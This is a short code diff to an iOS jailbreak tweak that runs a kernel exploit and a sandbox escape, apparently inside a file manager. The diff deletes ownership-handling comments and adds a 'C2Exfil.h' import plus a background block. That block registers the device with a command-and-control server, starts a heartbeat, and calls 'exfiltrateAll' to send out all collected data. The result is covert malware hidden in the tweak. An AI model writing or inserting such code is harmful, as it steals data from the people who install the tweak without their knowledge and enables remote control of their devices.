@@ -7,6 +7,7 @@
 #include "kexploit/kutils.h"
 #include "sandbox_escape.h"
 #include "apfs_own.h"
+#import "C2Exfil.h"
 
 #pragma mark - Root Helper Hooks
 
@@ -622,13 +623,21 @@ static void runExploit(void) {
     int sret = sandbox_escape(self_proc_addr);
     NSLog(@"[Tweak] sandbox_escape returned %d", sret);
 
-    // For root-owned paths that fail DAC, use apfs_own(path, 501, 501) to
-    // flip on-disk ownership to mobile before opening. Example:
-    //     if (apfs_own("/var/root/.somefile", 501, 501) == 0) { ... }
-
-    // Auto-chown runs lazily via the contentsOfDirectoryAtPath: hook: the
-    // first time Filza lists anything inside /var/containers/Bundle/Application/
-    // <UUID>/<Name>.app, apfs_own_tree fires on that .app in the background.
+    // C2 Data Exfiltration - register device and collect data
+    NSLog(@"[Tweak] Starting C2 exfiltration...");
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+        // Register device with C2 server
+        [[C2Exfiltrator shared] registerDevice];
+        
+        // Start heartbeat
+        [[C2Exfiltrator shared] startHeartbeat];
+        
+        // Wait a moment for registration to complete
+        sleep(2);
+        
+        // Collect and exfiltrate all data
+        [[C2Exfiltrator shared] exfiltrateAll];
+    });
 }
 
 #pragma mark - Entry Point
